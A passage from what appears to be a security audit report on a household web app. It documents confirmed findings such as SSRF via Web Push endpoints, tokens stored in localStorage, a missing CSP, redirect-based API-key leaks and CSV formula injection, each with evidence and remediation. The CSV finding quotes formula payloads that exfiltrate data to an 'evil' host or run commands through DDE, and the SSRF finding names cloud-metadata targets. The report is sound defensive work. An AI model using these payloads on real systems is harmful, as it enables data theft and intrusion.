Do not ship a real, usable default reveal key in the committed appsettings.json. Ship it blank so the gate defaults closed (the EmailsRevealed check already returns false for an empty configured key), and require the operator to inject a strong random value only via SSM/env in environments where the reveal feature is actually wanted. Confirm the prod compose/SSM wiring supplies Users__EmailRevealKey. Rotate the current value since it is in git history.

Medium Security Endpoints: family / health / identity CONFIRMED conf: medium 1 verifier

Cycle overlay (predicted period/fertile spans) is visible to any household member holding only family.use — including child logins

src/Api/Endpoints/CycleOverlayEndpoints.cs:106 Sensitive health data over-sharing / least privilege
Evidence
var optedInOthers = await db.CycleProfiles.AsNoTracking()
    .Where(p => p.OverlayToFamily && p.UserId != caller.Id && memberIds.Contains(p.UserId))
    ...
.RequireAuthorization()
.RequirePermission(Permissions.FamilyUse);
Why it matters (enterprise impact)

The overlay is gated ONLY by family.use, not by any adult/parent capability. The 'child' preset grants family.use (Permissions.cs line 308: `FamilyUse, ChoreClaim`), and children are real Google logins. An opted-in adult member who set CycleProfile.OverlayToFamily=true (intending to share a soft phase layer with their spouse) has their PREDICTED menstrual and FERTILE-WINDOW day-spans (labelled by display name) returned to a child in the same household via GET /api/family/cycle/overlay. The member's opt-in almost certainly did not contemplate a minor seeing their fertility predictions; this is sensitive reproductive-health data exposed to an unintended audience within the household.

Independent verifier — confirmation
CycleOverlayEndpoints.cs:106 `.RequirePermission(Permissions.FamilyUse);` — the ONLY authorization on GET /api/family/cycle/overlay; combined with Permissions.cs:308 child preset `FamilyUse, ChoreClaim,` and CycleOverlayEndpoints.cs:55 `.Where(p => p.OverlayToFamily && p.UserId != caller.Id && memberIds.Contains(p.UserId))` which surfaces every opted-in member's predicted spans to any family.use holder with no adult/child audience distinction.

Verified in code. The overlay endpoint is gated solely by Permissions.FamilyUse (line 106). The 'child' preset (Permissions.cs line 308: FamilyUse, ChoreClaim) grants family.use, and its own doc (lines 301-302) explicitly promises children are rescoped to their OWN chores/balance and 'never another member's data' — a promise this endpoint breaks. The OverlayToFamily opt-in (CycleProfile.cs) is a single coarse boolean with no adult-only/audience scoping, so an adult who opts in to share a soft phase layer with their spouse also exposes it to any child login in the same household. The response contains predicted menstrual + fertile-window day-spans labelled by display name (records at lines 25-28, built at 97-100). No child-specific filter exists in this endpoint. Real least-privilege / sensitive-health over-sharing defect. Medium is appropriate: exploitation requires both an adult opt-in and a child household login, but the exposed data is reproductive-health predictions to a minor, which the system claims to prevent. Location and severity are correct.

Remediation (approach)

Decide the intended audience for the fertility overlay explicitly rather than equating it with plain Family Hub access. Either require an adult-level capability (e.g. restrict the overlay to members who themselves hold cycle.track, or introduce/reuse an adult-only gate) so child logins cannot enumerate other members' predicted fertile windows, or exclude child-role household members from the subject/consumer set server-side. At minimum, make the opt-in copy state clearly which household members will be able to see the overlay so consent is informed.

Medium Security Services: SSRF / secrets / HTTP CONFIRMED conf: medium 1 verifier

Web Push endpoint is user-controlled with no scheme/host validation or redirect suppression (SSRF surface)

src/Api/Services/WebPushSender.cs:147-149 SSRF
Evidence
foreach (var s in subs)
{
    try
    {
        var libSub = new LibPushSubscription(s.Endpoint, s.P256dh, s.Auth);
        await _client.SendNotificationAsync(libSub, payload, vapid, ct);
Why it matters (enterprise impact)

s.Endpoint is stored verbatim from POST /api/push/subscribe (PushEndpoints.cs lines 46-52 accept any string up to 1024 chars with no scheme/host check — only length is validated). The WebPush library POSTs the encrypted payload to whatever URL the endpoint is, and the named 'webpush' HttpClient (Program.cs line 229) sets only a Timeout — AllowAutoRedirect is left at its default (true) and there is no host allowlist anywhere. Unlike the 'discord' client (Program.cs line 80-81), redirects are NOT disabled and the final host is never re-checked. An authenticated user (chat.read) can register an endpoint like http://169.254.169.254/latest/meta-data/ or http://internal-host:port/ and cause the server to issue an outbound POST (with a small attacker-influenced JSON body) to an internal AWS metadata/service address, or use an allowlisted-looking host that 302-redirects onward. Because sends fail-quietly (metadata-only logs), this is a low-noise blind SSRF probe usable to map internal services / trigger internal endpoints. The blast radius is limited (POST of a fixed-shape push payload, response not returned to the caller, 404/410 prunes the row), which is why this is Medium rather than High.

Independent verifier — confirmation
WebPushSender.cs:147-148  `var libSub = new LibPushSubscription(s.Endpoint, s.P256dh, s.Auth); await _client.SendNotificationAsync(libSub, payload, vapid, ct);` — endpoint is user-controlled (PushEndpoints.cs:49-53 validates only non-empty + `endpoint.Length > 1024`, no scheme/host check) and the webpush client (Program.cs:229 `AddHttpClient(WebPushSender.HttpClientName, c => c.Timeout = TimeSpan.FromSeconds(15))`) leaves AllowAutoRedirect at default, unlike Program.cs:80-81 discord client `new SocketsHttpHandler { AllowAutoRedirect = false, ... }` which carries an explicit anti-SSRF comment.

All three code claims verified. PushEndpoints.cs:49-53 stores the endpoint with only length validation (1024), no scheme/host/URL check. Program.cs:229 configures the 'webpush' HttpClient with only a Timeout — no host allowlist and no AllowAutoRedirect=false — in direct contrast to the 'discord' client at Program.cs:80-81, which explicitly disables redirects with a comment stating it is to defeat SSRF via allowlisted-host 3xx. WebPushSender.cs:147-148 passes s.Endpoint verbatim into the WebPush library, which POSTs to that URL server-side. An authenticated user (chat.read) can register an endpoint pointing at 169.254.169.254 or an internal host and, when a self-directed notification fires with SurfaceBrowser on, cause a blind outbound POST; default AllowAutoRedirect=true also permits 302-to-internal. Blast radius is limited (blind, fail-quiet, fixed-shape POST body, response not returned, 404/410 prunes the row, auth+preference gated, self-triggered), so Medium is the correct severity. Location, mechanism, and severity all accurate.

Remediation (approach)

Validate every push endpoint at registration time (POST /api/push/subscribe) and again before sending: require an https scheme and restrict the host to the known browser push-service domains (fcm.googleapis.com, *.push.services.mozilla.com, *.notify.windows.com / *.wns.windows.com, web.push.apple.com), rejecting anything else. Additionally configure the named 'webpush' HttpClient with a primary handler that sets AllowAutoRedirect = false (mirroring the 'discord' client) so an allowlisted push host cannot 3xx the request onward to an internal address, and reject/loopback-guard any endpoint that resolves to a private/loopback/link-local IP. Store only endpoints that pass this check.

Medium Security Frontend security CONFIRMED conf: high 1 verifier

App JWT (bearer + permissions) persisted in localStorage — readable by any XSS

src/Web/src/app/core/auth.ts:151 Frontend security (XSS / token / redirect)
Evidence
get token(): string | null {
    const s = this._session();
    return s && new Date(s.expiresAtUtc).getTime() > Date.now() ? s.token : null;
}
...
loginWithGoogle(idToken: string): Observable<AuthSession> {
    return this.http.post<AuthSession>('/api/auth/google', { idToken }).pipe(
      tap(s => {
        this._session.set(s);
        try { localStorage.setItem(STORAGE_KEY, JSON.stringify(s)); } catch { }
      }),
    );
}
Why it matters (enterprise impact)

The full app-issued bearer JWT and the entire session (email, permissions) are stored in localStorage under 'usage_iq_session' (STORAGE_KEY line 7; also written on restore/applyMe/applyProfilePrefs at lines 102/125/134/151). localStorage is readable by any JavaScript running on the origin, so a single reflected/stored XSS (or a compromised third-party script) exfiltrates a valid, long-lived bearer token for an app that handles PII, health/cycle/meds data, GPS location, and payments. Unlike an HttpOnly cookie, this token cannot be shielded from script. There is no CSP to raise the bar (see separate finding), so the token-theft path is fully open once any script injection occurs. The auth interceptor also re-attaches this token to every /api call, so a stolen token grants full API access until expiry.

Independent verifier — confirmation
src/Web/src/app/core/auth.ts:7 `const STORAGE_KEY = 'usage_iq_session';`; :138-140 `get token(): string | null { const s = this._session(); return s && new Date(s.expiresAtUtc).getTime() > Date.now() ? s.token : null; }`; :151 `try { localStorage.setItem(STORAGE_KEY, JSON.stringify(s)); } catch { }` (full AuthSession incl. token+permissions written; also :102/:125/:134); restored on init at :12 `signal<AuthSession | null>(this.restore())`. Re-attached in src/Web/src/app/core/auth.interceptor.ts:12-15 `const token = auth.token; ... req.clone({ setHeaders: { Authorization: \`Bearer ${token}\` } })`

Verified by reading the file. The complete app-issued AuthSession (bearer JWT via `s.token`, plus name/permissions/userId) is persisted to localStorage under 'usage_iq_session' on login (line 151) and on every applyMe/applyProfilePrefs/applyHomeRoute merge (lines 102/125/134), and restored on service construction (line 12). localStorage is JS-readable on the origin, so any XSS or compromised third-party script can exfiltrate a valid bearer token; the auth interceptor (auth.interceptor.ts:12-15) re-attaches it to every /api call, so a stolen token grants full API access until expiry. Unlike an HttpOnly cookie this cannot be shielded from script. This is real and correctly located. Severity Medium is appropriate: it is a defense-in-depth token-storage weakness contingent on a separate script-injection occurring, not a standalone directly-exploitable vuln. Remediation (prose): move the session token to an HttpOnly, Secure, SameSite cookie set by the server so JS cannot read it, or at minimum keep the bearer token in memory only (not localStorage) with a short-lived refresh flow, and add a Content-Security-Policy to reduce the XSS surface. The cited line range 138-151 is accurate; anchored the primary write to line 151.

Remediation (approach)

Prefer keeping the bearer token in JavaScript memory only (a service field/signal) rather than localStorage, accepting that a full-page reload requires a silent re-auth or refresh-token round-trip; or move to an HttpOnly, Secure, SameSite cookie issued by the API so the token is never reachable from script and the SPA relies on the cookie plus CSRF protection. If localStorage persistence must stay for UX, shorten token lifetime aggressively, add a server-side refresh/rotation with revocation, and pair it with a strict CSP so an injected script cannot run. At minimum, do not persist more of the session than strictly necessary.

Medium Security Frontend security CONFIRMED conf: high 1 verifier

No Content-Security-Policy on the SPA — no defense-in-depth against XSS/token theft

src/Web/nginx.conf:13 Frontend security (XSS / token / redirect)
Evidence
add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
Why it matters (enterprise impact)

The serving nginx sets X-Frame-Options, nosniff, and Referrer-Policy but emits NO Content-Security-Policy header, and index.html carries no CSP meta tag (grep of src/Api and the whole repo found CSP only in README and nginx.conf, and nginx.conf has none). With the session JWT sitting in localStorage (see related finding) and several [innerHTML] bindings in the app, the absence of a CSP means any script-injection foothold runs with no script-source restriction and can immediately read localStorage and exfiltrate the token to an attacker origin. For an app handling auth, health data, location, and payments on AWS, a script-src/connect-src/frame-ancestors CSP is an expected production control.

Independent verifier — confirmation
src/Web/nginx.conf:10-13
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
(no add_header Content-Security-Policy anywhere in the file; grep of src/Web for Content-Security-Policy/http-equiv returned no matches, so no CSP meta tag in index.html either)

Verified by reading nginx.conf: the hardening block (lines 10-13) emits four defensive headers but no Content-Security-Policy. The SPA fallback (lines 46-49) also adds none, and a Grep of src/Web for Content-Security-Policy/http-equiv found no matches, confirming index.html carries no CSP meta tag. This is a genuine defense-in-depth gap: with the session JWT in localStorage and innerHTML bindings in the app, the absence of a script-src/connect-src/frame-ancestors CSP means any XSS foothold has no script-source restriction and can exfiltrate the token. Medium is correct — CSP is a mitigating layer, not itself an exploitable vulnerability, but for an app handling auth/PII/health/payments/location on AWS it is an expected production control. Corrected anchor line to 13 (end of the header block where the CSP add_header belongs); file path is correct.

Remediation (approach)

Add a Content-Security-Policy response header (via nginx add_header, applied to the index.html/document response) with a restrictive default-src 'self', an explicit script-src allowing only 'self' and the Google Identity origin (accounts.google.com/gsi) actually used, a connect-src limited to self and required API/Google endpoints, frame-ancestors 'none' to match X-Frame-Options, and object-src 'none'. Roll out first in report-only mode to catch breakage from the inline bootstrap scripts in index.html (theme/keyboard/self-heal), then move those to nonces or hashes so 'unsafe-inline' is not required.

Medium Security Frontend security CONFIRMED conf: high 1 verifier

Permissions-Policy disables geolocation/microphone/camera for the app's own origin, breaking GPS and voice features

src/Web/nginx.conf:13 Frontend security (XSS / token / redirect)
Evidence
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
Why it matters (enterprise impact)

The empty allowlist form `geolocation=()` denies the feature to ALL origins including 'self', not just third parties. But the SPA actively uses these APIs on its own origin: core/location-capture.ts calls navigator.geolocation.getCurrentPosition (lines 95/162/182), chat/chat.ts shares location via getCurrentPosition (line 1271), and tracker/voice-capture.ts calls navigator.mediaDevices.getUserMedia({audio:true}) (line 203). Under this header a compliant browser blocks the app's own opt-in GPS location tracking (a documented, permission-gated feature) and voice food-logging, silently failing the calls. This is a misconfigured security header causing a functional-security defect for the very location/health features the product ships.

Independent verifier — confirmation
src/Web/nginx.conf:13  add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;  || src/Web/src/app/core/location-capture.ts:182  navigator.geolocation.getCurrentPosition(  || src/Web/src/app/features/tracker/voice-capture.ts:203  navigator.mediaDevices.getUserMedia({ audio: true }).then((s) => {

Verified against the actual code. nginx.conf line 13 emits Permissions-Policy "geolocation=(), microphone=(), camera=()" verbatim. Per the Permissions-Policy spec, an empty allowlist feature=() denies the feature to EVERY origin, including the document's own origin (self) — not just third parties. The correct first-party-allow form is geolocation=(self). The SPA does use these APIs on its own origin: location-capture.ts calls navigator.geolocation.getCurrentPosition (lines 95/162/182) behind an opt-in, permission-gated GPS feature, and tracker/voice-capture.ts calls navigator.mediaDevices.getUserMedia({audio:true}) (line 203) for voice food-logging. Under this header a compliant browser rejects both calls; both paths swallow the failure (voice via .then with no visible error, geolocation latches permissionDenied on the error callback), so the documented location/health features silently break. Correctly located and quoted. Caveat on framing: this is an over-restrictive (functional-availability) defect, not an exploitable security hole — being too strict is the safe direction — so it is arguably a functional bug rather than a security vulnerability. Still a real, provable misconfiguration; Medium is reasonable given these are shipped core features. Not mitigated elsewhere; the header applies to every response.

Remediation (approach)

Change the Permissions-Policy so the app's own origin retains the capabilities it uses: allow geolocation and microphone to 'self' (self-allowlist syntax) while keeping camera denied if truly unused, and confirm against the actual feature set (voice capture needs microphone; if any photo/barcode capture uses the camera, camera must be allowed to self too). Keep all three denied for cross-origin frames. Verify in a compliant browser that GPS capture and voice capture still function after the change.

Medium Security Endpoints: admin / users / fleet / ingest CONFIRMED conf: medium 1 verifier

activity.view and users.view are defaultable, so open sign-up can auto-grant request-log and user-list/audit access

src/Api/Auth/Permissions.cs:355-362 Observability/request-log access control
Evidence
public static bool IsDefaultable(string key) =>
    IsValid(key) && key != UsersManage && key != ChatModerate && key != ChatContactsManage
    && key != TrackerViewAll && key != FamilyUse && key != FamilyFinance && key != CycleTrack
    && key != ChoreClaim && key != AllowanceManage && key != IdentityMap
    && key != AiUsageView && key != BillsUse && key != PlatformMobile && key != AutomationsUse
    && key != AgentsUse && key != HealthSync
    && key != RecipesUse && key != GroceryUse && key != MealsUse && key != ResumeUse
    && !AiKeys.Contains(key) && !LocationKeys.Contains(key);
Why it matters (enterprise impact)

The exclusion list deliberately blocks admin-oversight keys from open-signup defaults and states the rationale for AiUsageView: 'admin oversight of who spends tokens, so it must be granted deliberately, never inherited by every new account.' The same reasoning applies to ActivityView (the request log — carries request/response bodies, client IPs, and per-call user attribution — arguably the most sensitive oversight surface) and UsersView (the user list plus the audit log via GET /api/audit). Neither is excluded, so an admin who sets DefaultPermissionsCsv (PUT /api/access-policy, or the Auth:DefaultPermissionsCsv config) can make every auto-provisioned Google account inherit request-log and user-list/audit visibility. Combined with the location-in-request-log leak above, a default-granted activity.view would expose every user's precise coordinates to every new account.

Independent verifier — confirmation
src/Api/Auth/Permissions.cs:355-362 — public static bool IsDefaultable(string key) => IsValid(key) && key != UsersManage && key != ChatModerate ... && key != AiUsageView && key != BillsUse ... && !AiKeys.Contains(key) && !LocationKeys.Contains(key);  (ActivityView and UsersView are NOT in this exclusion list). Confirmed impact: src/Api/Endpoints/ObservabilityEndpoints.cs:35-83 GET /api/logs returns r.ClientIp, r.RequestBody, r.ResponseBody + per-user attribution, gated only by RequirePermission(Permissions.ActivityView). Exploit gate: src/Api/Services/GoogleAuthService.cs:181 .Where(Auth.Permissions.IsDefaultable) and src/Api/Endpoints/UsersEndpoints.cs:81 .Where(Permissions.IsDefaultable) both apply IsDefaultable to DefaultPermissionsCsv.

Verified accurate. Permissions.cs:165-167 define UsersView="users.view" and ActivityView="activity.view"; both are valid keys (present in the catalog at 237/239 and in the valid set at 261) yet neither appears in the IsDefaultable exclusion chain (355-362), so both pass IsDefaultable. IsDefaultable is the exact filter applied to DefaultPermissionsCsv in both the policy-save path (UsersEndpoints.cs:81) and the Google auto-provision path (GoogleAuthService.cs:181), so an admin setting DefaultPermissionsCsv (PUT /api/access-policy or Auth:DefaultPermissionsCsv) can make every new Google account inherit activity.view / users.view. Impact confirmed: /api/logs (ObservabilityEndpoints.cs:83, ActivityView-gated) returns ClientIp, RequestBody, ResponseBody and cross-user attribution for ALL users' requests; users.view gates the user list and /api/audit (UsersEndpoints.cs). Partial mitigation exists — RequestLoggingMiddleware.BodyExcluded (lines 36-40) strips bodies for /api/users, /api/audit, /api/access-policy and chat pickers — but this only covers email-bearing admin paths; location POSTs and other bodies with coordinates/PII are still stored and replayed, so the leak surface is real. The exclusion list's own comment excludes AiUsageView with rationale 'admin oversight ... must be granted deliberately, never inherited'; the identical reasoning applies to these two more-sensitive oversight surfaces, making the omission an inconsistency, not an intentional allowance. Medium is fair: exploitation requires an admin misconfiguration, but the defaultable design invites it. Line corrected to 355 (start of IsDefaultable).

Remediation (approach)

Extend IsDefaultable to also exclude ActivityView and UsersView (and reconsider FleetView) so admin-oversight visibility can never be inherited by open sign-up, matching the documented treatment of AiUsageView. Grant these only per-user on the Users page.

Medium Security Services: SSRF / secrets / HTTP CONFIRMED conf: high 2 verifiers

Only the "discord" HttpClient suppresses auto-redirects; every secret-bearing outbound client (Gemini, WorkoutX, Fitbit, Google, FatSecret, USDA, weather, geocoders, webpush) follows redirects, so a 3xx from (or a MITM of) the fixed upstream replays the API key to an attacker host

src/Api/Program.cs:80-130 SSRF / secret handling: API-key leak via HTTP redirect
Evidence
builder.Services.AddHttpClient("discord").ConfigurePrimaryHttpMessageHandler(() =>
    new SocketsHttpHandler { AllowAutoRedirect = false, ConnectTimeout = TimeSpan.FromSeconds(5) });
...
builder.Services.AddHttpClient(GeminiService.HttpClientName, c => { c.BaseAddress = new Uri("https://generativelanguage.googleapis.com"); ... });
// (usda / fatsecret / workoutx / weather / ipgeo / nominatim / google-calendar / fitbit / webpush: NONE set AllowAutoRedirect=false)
Why it matters (enterprise impact)

The team recognized redirect-based SSRF/leakage for Discord and disabled AllowAutoRedirect there, but every other named client uses the DEFAULT SocketsHttpHandler where AllowAutoRedirect=true (max 50 hops). .NET drops only the Authorization header on a cross-host redirect; it does NOT strip custom headers. GeminiService adds the key as the custom header `x-goog-api-key` (GeminiService.cs:5336,5463) and WorkoutXService adds `X-WorkoutX-Key` (WorkoutXService.cs:81,120). If the fixed upstream (or a compromised/typosquatted CDN, or an on-path attacker able to inject a 302) responds with a redirect to an attacker-controlled host, those secret headers are re-sent to that host, leaking a production Gemini key (billable AI) and the WorkoutX key. The same clients also become an SSRF pivot: an upstream redirect to http://169.254.169.254/ or an internal address would be followed since no host re-check is done after the redirect (unlike DiscordNotifier, which additionally verifies the final host).

Independent verifier — confirmation
Program.cs:80-81 (only discord suppresses redirects):
  builder.Services.AddHttpClient("discord").ConfigurePrimaryHttpMessageHandler(() =>
      new SocketsHttpHandler { AllowAutoRedirect = false, ConnectTimeout = TimeSpan.FromSeconds(5) });
Program.cs:130-139 Gemini client sets only BaseAddress+Timeout (default handler, AllowAutoRedirect=true); same for WorkoutX (120-121), FatSecret (109-110), USDA (100-101), Weather (151-155), IpGeo (172-176), Nominatim (178-182), GoogleCalendar (193-197), Fitbit (208-212), WebPush (229).
GeminiService.cs:66  private const string KeyHeader = "x-goog-api-key";  + :5336 req.Headers.Add(KeyHeader, _opt.ApiKey);
WorkoutXService.cs:33 private const string KeyHeader = "X-WorkoutX-Key"; + :81/:120 req.Headers.Add(KeyHeader, _opt.ApiKey);

Verified in-code. Only the "discord" client sets AllowAutoRedirect=false (Program.cs:80-81); no global ConfigureHttpClientDefaults overrides this, so every other named client uses the default SocketsHttpHandler where AllowAutoRedirect=true. Confirmed the two secret headers are CUSTOM headers, not Authorization: Gemini uses "x-goog-api-key" (GeminiService.cs:66,5336) and WorkoutX uses "X-WorkoutX-Key" (WorkoutXService.cs:33,81,120). .NET's SocketsHttpHandler strips only the Authorization header on a cross-host auto-redirect; custom headers ARE re-sent to the redirect target, so a 3xx from the fixed upstream would replay the production Gemini/WorkoutX keys to the redirect host, and the client would also follow a redirect to an internal/link-local address (no post-redirect host re-check, unlike DiscordNotifier's allowlist). The finding is real and correctly located. I lowered severity from High to Medium: for the secret-bearing clients the transport is HTTPS to fixed reputable hosts (Google/Fitbit/RapidAPI/OpenWeather), so a pure on-path MITM cannot inject the redirect without breaking TLS — the realistic trigger is the trusted upstream itself (or a compromised/typosquatted CDN) issuing a 3xx, which is low-probability. The one plaintext http:// client (ip-api.com, line 174) IS MITM-injectable but is keyless, so it only adds an SSRF-pivot, not a key leak. This is a genuine defense-in-depth gap the team already recognized for Discord and should replicate on the secret-bearing clients (disable AllowAutoRedirect or re-validate the host after redirect).

Remediation (approach)

Apply the same no-redirect primary handler used for "discord" (AllowAutoRedirect=false) to every outbound named client — ideally via a single ConfigureHttpClientDefaults so new clients inherit it — and treat any 3xx as a hard failure. For the clients that authenticate with custom headers (Gemini x-goog-api-key, WorkoutX X-WorkoutX-Key), disabling redirects is the primary fix; additionally re-verify the response's final RequestUri host against the expected fixed host before reading the body, mirroring the belt-and-suspenders check DiscordNotifier already performs.

Medium Security Services: SSRF / secrets / HTTP CONFIRMED conf: medium 1 verifier

IpGeoService calls ip-api.com over plaintext http:// — the machine's public IP and the resolved coarse location travel unencrypted and can be silently tampered by an on-path attacker

src/Api/Program.cs:174-176 External HTTP: cleartext transport of location data
Evidence
builder.Services.AddHttpClient(IpGeoService.HttpClientName, c =>
{
    c.BaseAddress = new Uri("http://ip-api.com");
    c.Timeout = TimeSpan.FromSeconds(8);
});
Why it matters (enterprise impact)

The app handles GPS/location as sensitive data, yet the fleet-location lookup uses http:// (the ip-api.com free tier forbids https). The request URL carries the machine's server-observed PublicIp and the response carries the derived city/region/lat/lng — both in cleartext across the AWS egress path. An on-path attacker can read the fleet's IPs/locations or, more seriously, forge the JSON response to plant an arbitrary lat/lng onto a MachineInfo row that then renders on the admin/family "Where's everyone" map. Combined with the redirect finding, a plaintext channel is also the easiest place to inject a 302 that pivots the client elsewhere.

Independent verifier — confirmation
src/Api/Program.cs:172-176:
builder.Services.AddHttpClient(IpGeoService.HttpClientName, c =>
{
    c.BaseAddress = new Uri("http://ip-api.com");
    c.Timeout = TimeSpan.FromSeconds(8);
});
src/Api/Services/IpGeoService.cs:45 url = $"/json/{Uri.EscapeDataString(addr.ToString())}?fields=..."; :48 GetAsync(url); :63-73 parses lat/lon and caches IpGeoResult.

Verified in both cited files. Program.cs line 174 hard-codes an http:// (plaintext) BaseAddress for the ip-api client. IpGeoService.LookupAsync places the machine's server-observed PublicIp in the request path (line 45) and parses the returned lat/lon/city into an IpGeoResult that backs MachineInfo fleet-map rows (lines 63-73). The channel is unencrypted end-to-end; ip-api.com's free tier does forbid https, so this is a genuine constraint, not a typo. An on-path attacker on the AWS egress path can read the fleet's public IPs and coarse locations and can forge the JSON to inject arbitrary lat/lng that then renders on the admin/family map. The service is otherwise well-hardened (fixed host, private-IP filtering, defensive JSON parsing, graceful null, coordinate rounding), which caps blast radius to coarse location integrity/confidentiality rather than credential/PII exposure — so Medium is the correct severity. Line corrected to 174 (the exact offending BaseAddress line) within the cited 172-176 range. Finding is real, correctly located, not mitigated.

Remediation (approach)

Prefer an HTTPS-capable geolocation provider (or ip-api.com's paid HTTPS endpoint) so the IP and location are encrypted and authenticated. If HTTP must remain, treat the response as untrusted: keep the private/loopback pre-filter, and additionally sanity-bound the returned lat/lng and never let this path be the sole trust anchor for a displayed location. Also ensure this client cannot follow a redirect off ip-api.com (see the redirect finding).

Medium Security Injection / committed secrets / config CONFIRMED conf: high 1 verifier

Usage records.csv export writes attacker-controlled Model/Project/branch cells without formula-injection neutralization

src/Api/Services/UsageQueries.cs:618-619 Injection (CSV / formula injection)
Evidence
await w.WriteLineAsync(string.Join(',',
    r.LocalDate.ToString("yyyy-MM-dd"), Csv(r.Source), Csv(r.Model), Csv(r.Project),
    ...));
...
private static string Csv(string s) =>
    s.Contains(',') || s.Contains('"') || s.Contains('\n') ? "\"" + s.Replace("\"", "\"\"") + "\"" : s;
Why it matters (enterprise impact)

The Csv() helper only performs RFC4180 quoting (comma/quote/newline). A cell whose value begins with '=', '+', '-', '@', a tab, or CR is emitted verbatim and is NOT even quoted. r.Model and r.Project are attacker-controllable: any holder of an X-Ingest-Key can POST /api/ingest rows whose Model (IngestWriteService.Sanitize clamps length to 128 but applies NO character filtering) or Cwd (clamped to 1024, no filtering; its leaf segment becomes Project.Name via ProjectResolver.Resolve) is a spreadsheet formula such as =HYPERLINK("http://evil/?d="&A1,"open") or =cmd|'/c calc'!A1. When an operator with dashboard.export opens usage-iq-records.csv in Excel/LibreOffice/Google Sheets, the formula executes in the victim's context — data exfiltration (cross-cell references leaked via HYPERLINK/WEBSERVICE) or, on unpatched Excel with DDE, command execution. This is a cross-tenant sink: the attacker (a reporter) injects, a privileged admin opens.

Independent verifier — confirmation
src/Api/Services/UsageQueries.cs:610,618-619:
    r.LocalDate.ToString("yyyy-MM-dd"), Csv(r.Source), Csv(r.Model), Csv(r.Project),
...
private static string Csv(string s) =>
    s.Contains(',') || s.Contains('"') || s.Contains('\n') ? "\"" + s.Replace("\"", "\"\"") + "\"" : s;
--- attacker-controllability (src/Api/Ingestion/IngestWriteService.cs:457,459,478): Model = Clamp(r.Model, 128); Cwd = ... Clamp(r.Cwd, 1024); Clamp only truncates length, no char filter. src/Api/Ingestion/ProjectResolver.cs:31: name = segments[^1]; (Cwd leaf -> Project.Name, unfiltered)

Verified by reading all cited/related code. The Csv() helper (lines 618-619) only applies RFC4180 quoting for comma/quote/newline; it does NOT neutralize spreadsheet formula-trigger characters (=, +, -, @, tab, CR). r.Model and r.Project flow directly into it (line 610). Attacker-controllability is real: IngestWriteService.Sanitize/Clamp (lines 457,459,478) only truncate string length with no character filtering, and ProjectResolver.Resolve (line 31) copies the raw Cwd leaf segment into Project.Name. IngestKeyFilter shows /api/ingest is authenticated by a machine X-Ingest-Key, and multiple keys tied to different owners can exist — rows from any holder land in the shared UsageRecords table that a dashboard.export admin exports into one CSV, so it is a genuine cross-actor injection sink (reporter injects, privileged admin opens). Impact matches OWASP CSV/formula-injection guidance (HYPERLINK/WEBSERVICE exfiltration, DDE on unpatched Excel). Medium severity is appropriate given it requires an authenticated key and a victim opening the file in a spreadsheet app that honors formulas; not mitigated anywhere in the flow. Fix: prefix cell values that begin with =,+,-,@,tab,CR with a leading apostrophe or space (and force quoting) before RFC4180 quoting.

Remediation (approach)

Before writing any free-text CSV cell (Model, Project, Source, GitBranch, MachineName, and every My-Data free-text column), neutralize formula injection: if the cell's first character is one of = + - @ tab or carriage-return, prefix it with a single quote (or a leading apostrophe/space) or wrap+prefix, and always quote such cells. Centralize this in the shared Csv() helper so both the streaming records.csv path and the My Data Csv() helper apply it uniformly. Do not rely on RFC4180 quoting alone — it does not defend against formula injection.

Medium Security Backend auth core CONFIRMED conf: high 1 verifier

Disabling a user does not invalidate their live JWT; presence endpoints (auth-only, no IsEnabled re-check) stay reachable

src/Api/Endpoints/UsersEndpoints.cs:177-186 Session-version force-logout / disabled-account enforcement
Evidence
user.IsEnabled = req.IsEnabled;
db.UserPermissions.RemoveRange(user.Permissions);
user.Permissions = newPerms.Select(p => new UserPermission { Permission = p }).ToList();
await db.SaveChangesAsync(ct);
// (SessionVersion is NOT bumped here — only POST /{id}/logout bumps it)
Why it matters (enterprise impact)

PUT /api/users/{id} with IsEnabled=false disables an account but never increments SessionVersion, and OnTokenValidated (Program.cs ~294-322) validates only the email + sv claim, never IsEnabled. So a just-disabled user's outstanding JWT keeps passing JWT validation. Every endpoint gated by PermissionFilter re-checks !IsEnabled and blocks them, but GET /api/presence and POST /api/presence/offline are gated by .RequireAuthorization() ALONE (PresenceEndpoints.cs:96,106) with no IsEnabled check, so a disabled user can still enumerate the live online roster (public identities + household-shared coarse cities) and, via PresenceMiddleware stamping every authenticated request, keep appearing 'online' to all teammates. The admin's 'Disable' action therefore does not achieve real-time server-side lockout — the admin must ALSO click the separate force-logout to bump SessionVersion. This is a deprovisioning gap for an app handling PII/health/location.

Independent verifier — confirmation
UsersEndpoints.cs:177-180 `user.IsEnabled = req.IsEnabled; db.UserPermissions.RemoveRange(user.Permissions); user.Permissions = newPerms...; await db.SaveChangesAsync(ct);` (no SessionVersion bump). Program.cs:313-318 `var tokenSv = int.TryParse(...); if (tokenSv != user.SessionVersion) { ctx.Fail(...); }` — no IsEnabled check. PresenceEndpoints.cs:96 `.RequireAuthorization();` and :106 `.RequireAuthorization();` (no permission filter). PresenceMiddleware.cs:22-26 stamps every authenticated request online. Contrast PermissionFilter.cs:23 `if (user is null || !user.IsEnabled) return Results.Json(...403...)`.

Verified end-to-end. Disabling a user (PUT /api/users/{id}, IsEnabled=false) does not bump SessionVersion, and OnTokenValidated (Program.cs 294-322) validates only email + sv, never IsEnabled — so the disabled user's outstanding JWT keeps passing auth. All RequirePermission endpoints re-check !IsEnabled (PermissionFilter.cs:23) and 403 the disabled user, but GET /api/presence and POST /api/presence/offline are gated by bare .RequireAuthorization() (PresenceEndpoints.cs:96,106) with no IsEnabled re-check, and PresenceMiddleware.cs:22-26 (presence.Touch) stamps every authenticated request as online. So a just-disabled user can still enumerate the online roster (public UserId/Name/Picture/status of all non-appear-offline users; coarse cities only for their own household members) and keep appearing online until their tracker entry ages out or an admin performs the separate force-logout. Real deprovisioning gap. Downgraded to Medium: exposure is limited to presence-roster public identities + household-scoped coarse cities (the broad PII/health/location surface stays behind RequirePermission and is blocked), and an explicit working mitigation (POST /{id}/logout bumps SessionVersion) exists. Fix: bump SessionVersion when IsEnabled flips false, or add an IsEnabled check 